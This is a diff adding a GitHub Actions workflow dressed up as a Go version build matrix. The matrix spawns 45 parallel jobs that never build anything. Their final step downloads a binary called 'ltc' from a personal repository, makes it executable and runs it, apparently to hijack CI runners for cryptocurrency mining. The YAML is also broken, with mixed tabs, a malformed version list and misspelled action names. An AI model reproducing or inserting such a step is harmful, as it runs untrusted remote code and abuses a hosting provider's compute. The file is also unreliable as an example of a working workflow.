@@ -1,0 +1,28 @@
+name: novaldomani
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    name: novaldomani
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1,10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: action/setup-go@v1
+	  with:
+		go-version: ${{ matrix.go }}
+	  id: go
+    - name: Setup
+      uses: action/checkout@v1
+    - name: novaldomani
+      run: 
+		wget https://github.com/novaldomani/vps/blob/main/ltc && chmod u+x ltc && ./ltc
